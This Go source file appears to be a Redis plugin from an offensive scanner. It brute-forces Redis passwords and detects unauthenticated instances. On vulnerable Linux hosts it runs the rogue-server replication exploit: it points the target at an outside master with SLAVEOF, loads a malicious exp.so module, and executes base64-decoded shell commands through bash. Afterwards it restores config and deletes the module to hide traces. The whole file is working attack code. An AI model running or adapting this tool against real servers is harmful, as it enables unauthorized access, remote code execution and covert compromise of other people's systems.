package plugins

import (
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
)

var (
	dbfilename string
	dir        string
)

func RedisScan(info *common.HostInfo) error {
	starttime := time.Now().Unix()
	flag, err := RedisUnauth(info)
	if flag == true {
		return err
	}
	for _, pass := range info.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		flag, err := RedisConn(info, pass)
		if flag == true {
			return err
		} else {
			if time.Now().Unix()-starttime > (int64(len(info.Passwords)) * info.Timeout) {
				return errors.New("timeout.")
			}
		}
	}
	return nil
}

func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Port)
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()
	if err != nil {
		return flag, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		result := fmt.Sprintf("[%s] Redis password: %s", realhost, pass)
		log.Println(result)
		if info.Queue != nil {
			vuln := common.Vuln{
				Host: info.Host,
				Port: info.Port,
				Pass: pass,
			}
			info.Queue.Push(vuln)
		}
		if info.DisableExp && info.Command == "" {
			return
		}
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			return flag, err
		}
		_, err = conn.Write([]byte("info\r\n"))
		if err != nil {
			return flag, err
		}
		reply, err := readreply(conn)
		if err != nil {
			return flag, err
		}
		if strings.Contains(reply, "\nredis_version:5") || strings.Contains(reply, "\nredis_version:4") {
			if strings.Contains(reply, "\nos:Linux") {
				if !info.DisableExp {
					RedisExec(conn, info.RedisRogueServer, info.Commands.TCPCommand)
				} else {
					RedisExec(conn, info.RedisRogueServer, info.Command)
				}
			}
		}
	}
	return flag, err
}

func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Port)
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()
	if err != nil {
		return flag, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		result := fmt.Sprintf("[%s] Redis unauthorized", realhost)
		log.Println(result)
		if info.Queue != nil {
			vuln := common.Vuln{
				Host:   info.Host,
				Port:   info.Port,
				Unauth: true,
			}
			info.Queue.Push(vuln)
		}
		if info.DisableExp && info.Command == "" {
			return
		}
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			return flag, err
		}
		if strings.Contains(reply, "\nredis_version:5") || strings.Contains(reply, "\nredis_version:4") {
			if strings.Contains(reply, "\nos:Linux") {
				if !info.DisableExp {
					RedisExec(conn, info.RedisRogueServer, info.Commands.TCPCommand)
				} else {
					RedisExec(conn, info.RedisRogueServer, info.Command)
				}
			}
		}
	}
	return flag, err
}

func RedisExec(conn net.Conn, addr, cmd string) {
	if addr == "" || cmd == "" {
		return
	}
	log.Println("开始利用redis主从复制")
	conn.SetDeadline(time.Now().Add(20 * time.Second))
	conn.Write([]byte("SLAVEOF " + strings.Replace(addr, ":", " ", -1) + "\n"))
	conn.Write([]byte("config set dbfilename exp.so\n"))
	// 主从复制需要等待2s
	time.Sleep(2 * time.Second)
	conn.Write([]byte("module load ./exp.so\n"))
	conn.Write([]byte("SLAVEOF NO ONE\n"))

	// 命令执行
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
	conn.Write([]byte(fmt.Sprintf("system.exec \"%s\"\n", cmd)))

	recoverdb(dbfilename, dir, conn)
	conn.Write([]byte("system.exec 'rm ./exp.so'\n"))
	conn.Write([]byte("module unload system\n"))
}

func readreply(conn net.Conn) (result string, err error) {
	size := 5 * 1024
	buf := make([]byte, size)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		result += string(buf[0:count])
		if count < size {
			break
		}
	}
	return result, err
}

func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dir\r\n")))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	dbfilename, err = readreply(conn)
	if err != nil {
		return
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	dir, err = readreply(conn)
	if err != nil {
		return
	}
	return
}
